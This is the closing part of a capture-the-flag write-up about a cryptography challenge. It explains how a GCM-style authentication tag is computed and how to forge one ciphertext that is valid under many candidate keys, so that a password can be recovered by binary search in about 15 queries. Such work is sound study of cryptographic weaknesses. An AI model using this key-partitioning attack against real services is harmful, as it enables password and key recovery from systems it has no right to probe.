<li>Slice the ciphertext to blocks of 16 bytes, let them be $b_1, b_2, \cdots b_m$, respectively.</li>
<li>Trasform the original ciphertext length (an integer) to 16 bytes block, and append this block to $[b_1, b_2, \cdots, b_m]$, so now we have $(m+1)$ blocks.</li>
<li>Generate $H$ and $mask$ by the key and the nonce (or initial vector), calculate $T = b_1 H^{m+1} + b_2 H^{m} + \cdots b_m H^2 + b_{m+1}H + mask$. This will be our tag.</li>
</ul>
<h4 id="tag-collision"><a class="header-link" href="#tag-collision"></a>Tag collision</h4>
<p>The idea is to forge a ciphertext that creates the same authentication tag under some of the keys, so by querying this pair of ciphertext and tag, we can eliminate some possibilties. </p>
<p>Ideally, we can do a binary search  forge a ciphertext and a tag that is valid under $\frac{26^3}{2}$ keys, so we eliminate half of the possibilities on our first guess, and we keep forging ciphertexts and tags that are valid under half of the possibilities. This requires $\lceil \log_2{26^3}\rceil = 15$ queries per key, which can solve this problem.</p>
<p>It is worth to mention that when we forge a ciphertext with some keys, we didn&#39;t really set the restriction that &quot;this ciphertext should not work with other keys&quot; because it happens with high probability.</p>
<h4 id="ciphertext-forging"><a class="header-link" href="#ciphertext-forging"></a>Ciphertext forging</h4>
<p>Now, given $k$ keys, or in other words, $k$ pairs of  $(H_i, mask_i)$, how can we forge the ciphertext and a tag? it is really simple if we fix the length of the ciphertext to be $16k$ so that </p>
<ul class="list">
<li>there&#39;s no padding</li>
<li>$m=k$, meaning we have exactly $k$ ciphertext blocks</li>
<li>$b_{m+1}$, the length block, is fixed</li>
</ul>
<p>If we plug in the numbers, we only have to solve a system of $k$ linear equation with $k$ variables $b_1, b_2, \cdots b_k$. This takes $O(k^3)$ Galois field operations because of Guassian elimintation. This can be further improved by the observation that the equation can be viewed as a polynomial of $H$, so we can perform the polynomial interpolation, which takes $O(k^2)$ field operations.</p>
<h4 id="capture-the-flag"><a class="header-link" href="#capture-the-flag"></a>Capture the flag</h4>
<p>We have all we need to recover a password in 15 operations. However, forging a ciphertext for $\frac{26^3}{2}$ keys can be slow. Therefore, we can consider making more queries to reduce the number of keys while forging. </p>
<p>A possible way is to seperate the set of possibilities to 26 equal-size set, and forge 26 ciphertexts for each of the sets, which has size $26^2$. So after 26 queries, we can know find the set that has the key, and then we can do the binary search with $\lceil\log{26^2}\rceil = 10$ queries. This method reduces the number of keys in the forging process from $\frac{26^3}{2}$ to $26^2$, and the first 26 ciphertext can also be reused for the next password.</p>
        </article>
      </div>
    </div>
  </body>
</html>
